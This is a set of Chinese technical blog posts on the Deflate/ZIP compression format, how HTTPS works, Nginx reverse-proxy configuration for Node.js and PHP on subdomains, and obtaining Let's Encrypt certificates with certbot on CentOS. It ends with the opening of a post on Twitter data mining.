ZIP中，首先使用LZ77编码进行压缩，然后之后再对LZ77编码之后的结果继续进行压缩（Huffman编码）,这个算法也叫做Deflate算法。 其实这个算法也支持静态的Huffman编码，无需记录码表，但是压缩率不高，所以大多数都采用动态的Huffman编码。 采用动态的Huffman编码其流程如下： ZIP中的LZ77 ZIP将LZ77的滑动窗口设置为32KB。虽然设置的窗口越大，越可能有重复的内容出现，但是相应的计算量也会变得很大，可能会得不偿失。 ZIP中只有3个字节以上的重复字符串，才会用（distance,length） 表示。 我们知道，经过LZ77算法之后，文件内容表示为literal、distance + length两种形式。Phil Katz继续对这两种形式进行huffman编码，可以说这过程其实才是ZIP算法的核心。 distance 码表 假如对一个文件进行LZ77压缩后，得到的distance值为：3、6、4、3、4、3、4、3、5，可以根据出现的次数画出哈夫曼树如下： 上面的两个哈夫曼树（这里称为码树）都是合法的，但对应的编码不同。 比如第一个的6的编码为111，而第二棵码树的6的编码为011。 那么问题来了，实际中我们应该怎么选？有好多种情况？ 我们知道huffman编码的本质是将出现频率高的编码尽可能的短。对于同一组数据，各种长得不同的huffman树得出的各个元素的长度是一样的，也就是说，我们只需要记录各个元素编码的长度就可以了。 比如上面的第一棵树，我们有：3--&gt;0；4--&gt;10；5--&gt;110；6--&gt;111。我们只需要记录：3-&gt;1 ; 4-&gt;2; 5-&gt;3; 6-&gt;3就可以了。 但是这样新的问题来了，在解压的时候，我们可以按照上面第一棵树那样构造huffman树，但是对于5和6来说，长度都是3，那么110表示的是5还是6？ 一个简单的解法就是直接按照数字的大小来确定（升序），这样相同的长度下就不会混乱了。 但是还有问题，由于我们滑动窗口的大小为32KB，就是说我们的distance范围为1-32KB就是1-32768。 那么我们怎么知道上面的就是3、4、5、6而不是1、2、3、4或者1-32768任意的四个不重复的数字（升序排列）呢？ 可以用一个序列来表示，没有出现的就是0，比如上面的3、4、5、6我们可以如下标记： 0、0、1、2、3、3、0、0、0、。。。。。。。。。。。。 考虑当时的硬件条件，如果压缩大文件的时候，distance达到上千是很正常的，计算机计算能力可能不足。Phil Katz将distance划分为多个区间，每个区间当作一个整数来看，这个称为distance code。我们对distance code进行huffman编码，然后再对该去区间的distance进行扩展即可。Phil Katz划分的区间如下： code为编号，就是distance code。之后就是用这个进行huffman编码的 bits为需要在code上扩展几位。最多扩展13位（PS：说明最多的区间有2^13 = 8192个数） distance表示这个区间的distance的范围。 虽然使用分区得到的编码不是最优的，但是在当时计算能力不足的情况下，的确能能够大大的加快速度。 此外，衡量一个压缩算法的话，压缩率并不是唯一的指标。我们还应该考虑时空复杂度、稳定性和移植性等等。 literal和length码表 Phil Katz把length的范围做了限制为256，因为一个重复的字符串达到256概率很小，即使超过256，就增加一个distace + length把。这样做可能也和当时硬件条件有关。 Phil Katz这次将literal和length合为一张表（就是一起huffman编码）。literal为0-255，256为结束标志，而257开始的为length。length同distance一样，也进行区间的划分，29个区间如下： 合为一张表的好处就是，解码的时候，先按照这个表来解码，如果是0-255，就表示literal，如果是256，则表示结束，如果是257-285，就是length（也说明后面的是distance）。这样一张表就可以区分出literal或者是length，这样就可以不用加一个标志来区区分。 再次压缩 上面有两次的huffman编码，literal/length码表1以及distace码表2。前面提到过为了能够解码，码表用一个码字长度序列表示，称为CL（Code Length），而记录两个码表的码字长度序列分别记为CL1、CL2。对literal/length的编码比特流称为LIT比特流；对distance的编码比特流称为DIST比特流。按照上面的方法，LZ的编码结果就变成三块：CL1、CL2、LIT比特流或DIST比特流。 由于CL全部都是数字，Phil Katz决定对CL继续编码。这里采用了游程编码。游程的含义为一段连续相同的数，而游程编码就是一段连续相同的数，只记录这个数一次，然后记录出现多少个即可。此外，Phil Katz认为，huffman编码后的码字长度不会超过15（PS: literal/length的编码符号286个，distance的编码符号共30个）。因此Phil Katz 用16、17、18三个额外的数字来表示重复数字（游程）： 数字 bits 表示的游程 表示重复的长度 例如 16 2 除了0外的 3-6 11表示重复2+3=5次（游程长从3开始） 17 3 0 3-10 111表示后面有连续的3+7=10个0 18 7 0 11-138 0111110表示连续11+62=73个0 比如CL序列如下， 4, 4, 4, 4, 4, 3, 3, 3, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 0, 0, 0, 0, 0, 0, 2, 2, 2, 2 游程编码的结果为： 4, 16, 01（二进制）, 3, 3, 3, 6, 16, 11（二进制）, 16, 00（二进制）, 17,011（二进制）, 2, 16, 00（二进制） 也就是4, 16, 1, 3, 3, 3, 6, 16, 3, 16, 0, 17, 3, 2, 16, 0 注意实际中上面标注的二进制应该反过来书写（小端序），比如01其实应该写成10 将CL进行游程编码后，我们又得到了一串0-18的整数，这个整数序列称为SQ（sequence），因为有CL1和CL2，所以我们有SQ1和SQ2。可以容易的统计出SQ中各个整数的出现次数，然后将SQ1和SQ2进行huffman编码，同理，这个码表3也用一个码字长度序列记录，称为CCL，由于最多有18个，Phil Katz认为树的深度至多为7，因此用3bit来记录。 得到CCL后，Phil Katz又继续折腾了一下，进行了置换，其示意图如下： 上面的表示置换前的，下面的表示置换后的，可以看出，16、17、18对应的CCL被放到了前面，这样如果尾部出现一些0，就可以忽略掉（因为我们记录了CCL的长度，补充0即可） Deflate压缩数据格式 ZIP的格式实际上就是Deflate压缩码流外面套了一层文件相关的信息。Deflate压缩码格式如下： 名称 长度 说明 Header 3bit 第1个比特如果是1，表示此部分为最后一个压缩数据块；否则表示这是.ZIP文件的某个中间压缩数据块，但后面还有其他数据块。这是ZIP中使用分块压缩的标志之一； 第2、3比特表示3个选择：压缩数据中没有使用Huffman、使用静态Huffman、使用动态Huffman HLIT 5bit 记录literal/length码字长度序列（CL1）的个数,CL1个数为HLIT + 257（0-255个literal加上一个256结束的，length长度为变化的） HDIST 5bit 记录distance码字长度序列（CL2）的个数，CL2个数为HDIST+1 HCLEN 4bit 记录码表3中码字长度序列（CCL）的个数，CCL个数为HCLEN+4 CCL HCLEN+4 用来构造码表3 huffman（SQ1） CL1经过游程编码缩短后（SQ1），然后对其用huffman编码。解码的时候解码到HLIT +257个即可。用来构造literal/length码表(码表1) huffman（SQ2） CL2经过游程编码缩短后（SQ2），然后对其用huffman编码。解码的时候解码到HDIST+1个即可。用来构造distance码表(码表2) LIT编码流或DIST编码流 对倒数第1、2内容块进行解码时，首先利用Huffman码表1进行解码，如果解码所得整数位于0-255之间，表示literal未匹配字符，用Huffman码表1解码；如果位于257-285之间，表示length匹配长度，之后需要利用Huffman码表2进行解码得到distance偏移距离；如果等于256，表示数据块解码结束。 小结 本来是想实现一下huffman编码，结果发现要解码的时候码表怎么保存这个问题，以及文件的格式应该怎么样的，自己想出了保存字符+频率重新构建，感觉并不是很好，于是想看看zip等压缩算法是怎么样做的，于是有了这篇blog。 由于我没有进行LZ77编码，所以只和Phil Katz对比 huffman的部分的主要区别。主要区别为： Phil Katz存码表的形式为CL，存的是各个字符的码字长度，而我是字符+存出现的次数。。。QAQ Phil Katz 还用游标编码对CL进一步进行压缩。。。 参考文献 ZIP压缩算法详细分析及解压实例解释 本文后面zip算法基本都是参考该文章的内容 gzip压缩算法","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"算法笔记","slug":"study/算法笔记","permalink":"https://www.hrwhisper.me/categories/study/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"HTTPS的二三事","slug":"introduction-to-https","date":"2017-02-21T03:21:13.000Z","updated":"2021-01-08T13:42:14.098Z","comments":true,"path":"introduction-to-https/","link":"","permalink":"https://www.hrwhisper.me/introduction-to-https/","excerpt":"前几篇博文都是有关HTTPS的东西，有人可能会问，什么是HTTPS？为什么要用HTTPS？ 因此，本文主要来解答这些疑惑","text":"前几篇博文都是有关HTTPS的东西，有人可能会问，什么是HTTPS？为什么要用HTTPS？ 因此，本文主要来解答这些疑惑 Https的故事 Alice和Bob是情人，他们每周都要写信。Alice 写好后，送到邮局，邮局通过若干个快递员到Bob，Bob回信过程类似。这是可以看成的简单的http的传输。 有一天，Alice觉得，要是写的信中途被人拆开了呢？毕竟一些小秘密不想让人知道啊。于是和Bob商定，采用加密的方法写。加密的方法比如使用古典密码的方案，如凯撒密码（A-&gt;E，B-&gt;F，即每个字母向右移动4个，(y + 4) mod 26）。这样加密了信的内容。 但是有一天，Alice收到Bob的信，信的内容经过解密后为分手之类的话。Alice跑去问Bob，Bob发现有人伪造了自己的信件，于是Alice和Bob商定，以后信上最后按上自己的指纹（就是数字证书），用来保证这封信别人伪造不了，此外，还用上校验码（数字签名），将信的内容经过hash，附带在信的末尾。在收信的一方收到后，首先查看是否有对方的指纹，并计算hash值和信的末尾所附带的是否一致，如果一致才进行解密查看。其实这样通信可以说从http到了https。 为什么需要HTTPS 通过上面的故事，现在可以来介绍一下https了。 https也叫做HTTP over TLS, HTTP over SSL, and HTTP Secure，Https 相比http来说，加密了传输过程和数据，能有效的保证了数据来源的可靠性、保密性以及数据的完整性。 保密性从何说起呢？这个很好理解。再http中，数据使用明文传输，容易受到第三方的窃取和修改，用户的隐私也容易泄漏。而使用https后，对于传输过程和数据都进行了加密，使得数据难以被窃听，隐私也不容易被泄漏。 数据的完整性呢？http中数据为明文，可能会被中间的劫持，然后修改。比较著名的有流量劫持，可以看知乎: 如何看待众多互联网公司联合声明：呼吁运营商严格打击流量劫持？。而https加密了内容，并且对传输的数据进行了校验，一旦被篡改，通信双方回立刻发现。 此外，还有来源的可靠性。比如访问hrwhisper.me，你可能访问一台假的服务器，而该服务器提供和真正服务器不一样的内容。使用https，服务器提供了身份的证书，能防止身份被冒充。 Https的过程 1. 客户端问候Clinethello 客户端向浏览器发出加密通信的请求。 这个请求有如下信息： 支持的加密通信协议版本、加密算法 随机数（一个时间戳加上28字节的随机数），后面用于生成对话密钥。 2. 服务器问候SeverHello 服务器接收到客户端请求，发送问候，该问候包含以下信息： 确认使用的加密通信协议版本和加密方法，比如TLS 1.2版本以及RSA公钥加密。（如果浏览器与服务器支持的版本不一致，服务器关闭加密通信。） 一个服务器生成的随机数，稍后用于生成\"对话密钥\"。 服务器证书。 3. 客户端回应 客户端受到服务器问候后，首先会验证服务器证书是否真实有效。该证书需要和服务器的域名一致，且在有效期内，并且由可信机构CA颁布。若该证书无效，会向用户显示警告，由用户选择是否继续访问（典型的看12306）。如果证书没有问题，客户端向服务器发送下面的信息： 随机数（pre-master secret），且该随机数用服务器公钥加密，防止被窃听 编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送。 客户端握手结束信息。前面发送的所有内容的hash值，用来供服务器校验。 4. 服务器的最后回应 服务器收到客户端的pre-master secret后，结合之前的两个随机数，计算生成本次会话所用的“会话密钥”，然后向客户端发送下面信息： 编码改变通知 服务器握手结束信息。前面发送的所有内容的hash值，用来供客户端校验。 经历了四次握手后，客户端与服务器进入加密通信，其实之后就是普通的http协议，只不过用会话密钥加密加密内容。此外，一般而言，https连接只在第一次握手时使用非对称加密，通过握手交换对称加密密钥，在之后的通信走对称加密。因为一般而言，如RSA等非对称加密耗费的CPU资源较大。 Https的几个问题 会话密钥 会话密钥是怎么产生的呢？客户端和服务器在Hello都产生了一个随机数，结合pre-master secret一起生成了会话密钥（服务器和客户端由相同的三个随机数）。可以看如下图 为什么上面的需要3个随机数，而不是只用pre-master secret生成会话密钥？ 因为每个主机并不是都能产生完全的随机数的。有很多产生的只是弱随机数而已，比如范围小，可能被猜测。如果该随机数被破解，那么之前一系列握手都是没什么用的。因此用三个随机数一起生成密钥能使得伪随机数更接近随机。 数字签名和数字证书 https中使用了数字签名和数字证书。 数字签名是私人的，用于加密摘要和报文。 数字证书是由CA中心派发的，用于证明身份。 详情可以看 数字签名是什么？ Https一定安全么 不一定。 比如使用弱密钥交换协议 Diffie-Hellman 。 此外，也和使用的安全传输协议有关，建议的是使用TLS1.0以上的版本（如TLS1.0, TLS1.1，TLS1.2，TLS 1.0通常被标示为SSL 3.1，TLS 1.1为SSL 3.2，TLS 1.2为SSL 3.3。）而SSL2.0有严重的漏洞，SSL3.0也有 https://www.openssl.org/~bodo/ssl-poodle.pdf 。 如果你的站点采用了https，可以用可以用https://www.ssllabs.com/ssltest/ 测试安全性。 HSTS协议 HSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。可在保证安全性的前提下，提高网站的响应速度。此外HSTS可以很大程度上解决SSL剥离攻击，因为只要浏览器曾经与服务器创建过一次安全连接，之后浏览器会强制使用HTTPS，即使链接被换成了HTTP。 小结 Https 为我们带来更安全的传输。Chrome 56中，将输入密码的非https网站标记为不安全。 Google 把https 作为网站排名的一个因素...... https需要数字证书，那么如何获取证书呢？过去证书需要购买，而现在我们应该感谢 Let’s Encrypt 项目，可以免费的签发个人的证书，这样能更好的推广https, 从而有一天真正实现Https as default。 关于Let’s Encrypt获取证书可以参考本博客 Let’s Encrypt！ Centos 获取https证书攻略 参考资料 RFC 5246 SSL/TLS协议运行机制的概述 HTTPS连接的前几毫秒发生了什么 HTTPS详解SSL/TLS","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"计算机基础","slug":"study/计算机基础","permalink":"https://www.hrwhisper.me/categories/study/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.hrwhisper.me/tags/HTTPS/"}]},{"title":"Node.js 部署小记（二级域名+Nginx反向代理PHP和Node.js）","slug":"using-nginx-to-run-php-app-and-nodejs-app-using-subdomain-force-https","date":"2017-02-16T01:09:11.000Z","updated":"2021-01-08T13:42:14.036Z","comments":true,"path":"using-nginx-to-run-php-app-and-nodejs-app-using-subdomain-force-https/","link":"","permalink":"https://www.hrwhisper.me/using-nginx-to-run-php-app-and-nodejs-app-using-subdomain-force-https/","excerpt":"情人节快到啦，身为一个程序员肯定要写个东西给妹纸啊 顺便学习一下nodejs + express，然后部署的时候问题来了： 服务器上跑着自己的博客，然后丢到一个目录下如hrwhisper.me/abc/ 轻微强迫症又感觉受不了，于是部署有如下要求： 采用二级域名 abc.hrwhisper.me ，不要出现端口号啥的 强制https （本站都是https） 博客和该项目互不干扰，即能跑Nodejs和PHP","text":"情人节快到啦，身为一个程序员肯定要写个东西给妹纸啊 顺便学习一下nodejs + express，然后部署的时候问题来了： 服务器上跑着自己的博客，然后丢到一个目录下如hrwhisper.me/abc/ 轻微强迫症又感觉受不了，于是部署有如下要求： 采用二级域名 abc.hrwhisper.me ，不要出现端口号啥的 强制https （本站都是https） 博客和该项目互不干扰，即能跑Nodejs和PHP 添加二级域名DNS 要弄二级域名，其实只需要把DNS解析一下即可。 添加A记录，以博主的是阿里云的DNS云解析为例，若二级域名为abc.hrwhisper.me，那么解析值填写如下（IP为你服务器的IP地址） 服务器安装nodejs 123cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;wget https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v6.9.5&#x2F;node-v6.9.5-linux-x86.tar.gztar zxvf node-v6.9.5-linux-x86.tar.gz 然后将解压后的文件复制到/usr/local/node/6.9.5，这也是我们之后的nodejs的目录 12mkdir -p &#x2F;usr&#x2F;local&#x2F;node&#x2F;6.9.5cp -r node-v6.9.5-linux-x86&#x2F;* &#x2F;usr&#x2F;local&#x2F;node&#x2F;6.9.5 接下来设置环境变量。 vim /etc/profile 在 export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROL 一行的上面添加如下内容: #set for nodejs export NODE_HOME=**/usr/local/node/6.9.5** export PATH=$NODE_HOME/bin:$PATH 编译/etc/profile 使配置生效 source /etc/profile 验证是否安装配置成功 node -v 配置Nginx nginx 先跑起PHP 由于本博客的已经跑在nginx了，并且是https，可以参考前几篇的方式： LNMP站点配置指南 Let’s Encrypt！ Centos 获取https证书攻略 值得注意的是，一般而言，二级域名的证书也要进行添加。 1sudo certbot certonly -a webroot --webroot-path=/var/www/html -d hrwhisper.me -d www.hrwhisper.me -d abc.hrwhisper.me Nginx路径解析 如果nginx中有多个server块，那么请求匹配server_name的顺序如下： 首先匹配准确的server_name，如：server_name abc.hrwhisper.me 然后匹配以*通配符开始的server_name，如：server_name *.hrwhisper.me 然后匹配以*通配符结束的server_name，如：server_name www.hrwhisper.* 最后匹配正则表达式形式的server_name，如：server_name ~^(?&lt;www&gt;.+)\\.hrwhisper\\.me$ 以上只有有一项匹配到以后就会停止搜索。 因此，我们二级域名abc.hrwhisper.me要能正确的被解析，那么可以采用准确匹配的方式。 因此，可以配置如下（采用Https） （abc.hrwhisper.me的配置文件abc.conf） 12345678910111213141516171819202122232425262728server &#123; listen 443; server_name abc.hrwhisper.me; ssl on; ssl_certificate &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;hrwhisper.me&#x2F;fullchain.pem; ssl_certificate_key &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;hrwhisper.me&#x2F;privkey.pem; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS;add_header Strict-Transport-Security &quot;max-age&#x3D;31536000; includeSubdomains&quot;; charset utf-8; location &#x2F; &#123; root &#x2F;var&#x2F;www&#x2F;abc; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Host $http_host; proxy_set_header X-NginX-Proxy true; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_pass http:&#x2F;&#x2F;localhost:3000; proxy_redirect off; &#125;&#125; 配置www.conf为 wordpress的博客（www.hrwhisper.me）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758server &#123; listen 443; listen [::]:443 ssl ipv6only&#x3D;on; server_name hrwhisper.me www.hrwhisper.me; ssl on; ssl_certificate &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;hrwhisper.me&#x2F;fullchain.pem; ssl_certificate_key &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;hrwhisper.me&#x2F;privkey.pem; # ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS;add_header Strict-Transport-Security &quot;max-age&#x3D;31536000; includeSubdomains&quot;; # enable HSTS including subdomains add_header Strict-Transport-Security &quot;max-age&#x3D;31536000; includeSubdomains&quot;; charset utf-8; access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log main; location &#x2F; &#123; root &#x2F;var&#x2F;www&#x2F;html; index index.php index.html index.htm; if (-f $request_filename&#x2F;index.html)&#123; rewrite (.*) $1&#x2F;index.html break; &#125; if (-f $request_filename&#x2F;index.php)&#123; rewrite (.*) $1&#x2F;index.php; &#125; if (!-f $request_filename)&#123; rewrite (.*) &#x2F;index.php; &#125; &#125; error_page 404 &#x2F;404.html; location &#x3D; &#x2F;404.html &#123; root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html; &#125; error_page 500 502 503 504 &#x2F;50x.html; location &#x3D; &#x2F;50x.html &#123; root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html; &#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # location ~ \\.php$ &#123; root &#x2F;var&#x2F;www&#x2F;html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;&#125; 强制Https 上面只配置了Https,我们将http版本301重定向到https的 配置/etc/nginx/conf.d/default.conf如下： 监听80端口 /.well-known/acme-challenge/ 不强制https 12345678910111213server &#123; listen 80; server_name *.hrwhisper.me; location ^~ &#x2F;.well-known&#x2F;acme-challenge&#x2F; &#123; default_type &quot;text&#x2F;plain&quot;; root &#x2F;var&#x2F;www&#x2F;html; &#125; location &#x2F; &#123; return 301 https:&#x2F;&#x2F;$host$request_uri; &#125;&#125; 然后测试配置文件 nginx -t 没有错的话就 service nginx reload 小结 其实用nginx实现上面的要求并不难，特别是一个子域名对应一个配置文件的话。 其实理论上应该是还能用泛域名解析的方式，这样能精简配置文件，但难点在于，我们并不是两个app都是php or nodejs，如果用if判断效率不如两个server_name的方式。","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Centos","slug":"Centos","permalink":"https://www.hrwhisper.me/tags/Centos/"},{"name":"Linux","slug":"Linux","permalink":"https://www.hrwhisper.me/tags/Linux/"}]},{"title":"Let's Encrypt！ Centos 获取https证书攻略","slug":"install-lets-encrypt-ssl-centos-nginx","date":"2017-02-12T06:02:57.000Z","updated":"2021-01-08T13:42:14.095Z","comments":true,"path":"install-lets-encrypt-ssl-centos-nginx/","link":"","permalink":"https://www.hrwhisper.me/install-lets-encrypt-ssl-centos-nginx/","excerpt":"之前本博客用的是沃通，但是不支持二级域名啥的。而且Mozilla 公布了停止信任沃通的证书，因此，这次要搞个二级域名，干脆换 Let's Encrypt 把~ 本文内容如下 获取证书的一些配置 自动更新证书","text":"之前本博客用的是沃通，但是不支持二级域名啥的。而且Mozilla 公布了停止信任沃通的证书，因此，这次要搞个二级域名，干脆换 Let's Encrypt 把~ 本文内容如下 获取证书的一些配置 自动更新证书 安装 certbot Centos 6 1234cd /usr/binwget https://dl.eff.org/certbot-autochmod a+x certbot-autoln -s /usr/bin/certbot-auto /usr/bin/certbot Centos 7 12yum install epel-releaseyum install certbot 获取let's Encrypt SSL证书 配置nginx 以nginx为例，在配置文件中添加 123location ~ &#x2F;.well-known &#123; allow all;&#125; 这个位置等下将被用于let's Encrypt生成证书过程中的验证路径。 所以一定要能被访问到。如果之前已有证书，且强制https,可以把default.conf 改为如下（ /var/www/html为你的web目录） 12345678910111213server &#123; listen 80; server_name hrwhisper.me; location ^~ &#x2F;.well-known&#x2F;acme-challenge&#x2F; &#123; default_type &quot;text&#x2F;plain&quot;; root &#x2F;var&#x2F;www&#x2F;html; &#125; location &#x2F; &#123; return 301 https:&#x2F;&#x2F;$server_name$request_uri; &#125;&#125; 然后保存，接下来 nginx -t 若测试没有报错，就重新载入nginx配置 service nginx reload or systemctl reload nginx 获取证书 需要修改下面的email以及相应的域名 1sudo certbot certonly --email abc@xxx.com -a webroot --webroot-path&#x3D;&#x2F;var&#x2F;www&#x2F;html -d hrwhisper.me -d www.hrwhisper.me 如果要给子域名添加，则 1sudo certbot certonly --email abc@xxx.com -a webroot --webroot-path&#x3D;&#x2F;var&#x2F;www&#x2F;html -d hrwhisper.me -d www.hrwhisper.me -d sub.hrwhisper.me 提示OK后，配置ssl.conf中证书位置为： 12ssl_certificate &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;hrwhisper.me&#x2F;fullchain.pem;ssl_certificate_key &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;hrwhisper.me&#x2F;privkey.pem; 下面是我完整的conf配置： ssl.conf:（见上方强制https的） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354## The https server#server &#123; listen 443; listen [::]:443 ssl ipv6only&#x3D;on; server_name hrwhisper.me; ssl on; ssl_certificate &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;hrwhisper.me&#x2F;fullchain.pem; ssl_certificate_key &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;hrwhisper.me&#x2F;privkey.pem; # ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS; # enable HSTS including subdomains add_header Strict-Transport-Security &quot;max-age&#x3D;31536000; includeSubdomains&quot;; charset utf-8; access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log main; location &#x2F; &#123; root &#x2F;var&#x2F;www&#x2F;html; index index.php index.html index.htm; if (-f $request_filename&#x2F;index.html)&#123; rewrite (.*) $1&#x2F;index.html break; &#125; if (-f $request_filename&#x2F;index.php)&#123; rewrite (.*) $1&#x2F;index.php; &#125; if (!-f $request_filename)&#123; rewrite (.*) &#x2F;index.php; &#125; &#125; error_page 404 &#x2F;404.html; location &#x3D; &#x2F;404.html &#123; root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html; &#125; error_page 500 502 503 504 &#x2F;50x.html; location &#x3D; &#x2F;50x.html &#123; root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html; &#125; location ~ \\.php$ &#123; root &#x2F;var&#x2F;www&#x2F;html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;&#125; 自动更新证书 由于获取的证书就三个月，我们可以用定时任务进行证书的更新： sudo crontab -e CentOS 6.x 1201 1 * * 0 &#x2F;usr&#x2F;bin&#x2F;certbot renew &gt;&gt; &#x2F;var&#x2F;log&#x2F;ssl-renew.log06 1 * * 0 &#x2F;sbin&#x2F;service nginx reload CentOS 7.x 1201 1 * * 0 &#x2F;usr&#x2F;bin&#x2F;certbot renew &gt;&gt; &#x2F;var&#x2F;log&#x2F;ssl-renew.log 06 1 * * 0 &#x2F;usr&#x2F;bin&#x2F;systemctl nginx reload 每周天凌晨1点，执行certbot renew 命令，并且将日记写入 /var/log/ssl-renew.log 参考资料 Nginx: Install Let’s Encrypt SSL on CentOS 6 and CentOS 7 How To Secure Nginx with Let's Encrypt on CentOS 7","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.hrwhisper.me/tags/HTTPS/"},{"name":"Centos","slug":"Centos","permalink":"https://www.hrwhisper.me/tags/Centos/"},{"name":"Linux","slug":"Linux","permalink":"https://www.hrwhisper.me/tags/Linux/"}]},{"title":"Twitter数据挖掘及其可视化","slug":"twitter-data-mining-and-visualization","date":"2017-02-09T11:53:43.000Z","updated":"2020-10-19T16:21:17.765Z","comments":true,"path":"twitter-data-mining-and-visualization/","link":"","permalink":"https://www.hrwhisper.me/twitter-data-mining-and-visualization/","excerpt":"前阵子有学弟学妹问我毕设做的啥，于是我决定记录一下去年毕设的内容。 主要是基于twitter的内容有： 实时热点话题检测 情感分析 结果可视化 Twitter数据挖掘平台的设计与实现","text":"前阵子有学弟学妹问我毕设做的啥，于是我决定记录一下去年毕设的内容。 主要是基于twitter的内容有： 实时热点话题检测 情感分析 结果可视化 Twitter数据挖掘平台的设计与实现 毕设、论文内容 毕设从16年3月开始做，做到5月初，开始写论文，当时写的论文一共有七章,写了一个礼拜，从早到晚- - 共24834字。数据有的从15年11月左右开始抓的。导师那时候很忙都没空理我- - 都自己说要做啥然后自己去做。。。。 论文总共有七章，结构安排如下： 第一章，引言。主要介绍了Twitter下进行的数据挖掘的背景，以及国内外研究现状，并简要的说明了本文的主要研究内容。 第二章，Twitter相关的内容介绍。主要介绍Twitter的一些特殊语法，如用户提及@，hashtags等，接着讨论了Twitter中大量存在的拼写错误、缩写、重复字母现象，最后介绍了Twitter的REST API与StreamAPI。 第三章，实时热点话题挖掘。该章节首先介绍了LDA相关的模型，接着提出了WOLDA算法，以及最具有代表性推文的计算方法。 第四章，情感分析。该章节介绍了Twitter下的情感分析分类、以及机器学习的一般过程，接着介绍本文使用机器学习和情感词典相结合的方法。 第五章，数据可视化。介绍了几种基于统计的可视化方法，还有主题分析和情感分析的可视化的方法，可以更直观的表示结果。 第六章，Twitter数据挖掘平台的设计与实现。结合了前面几章的内容，介绍实现该系统的细节。 第七章总结了本文的工作，针对目前的不足，提出下一步改进的方案。 本篇博文为缩减版，除了略去一二章外，其它章节也做了精简。 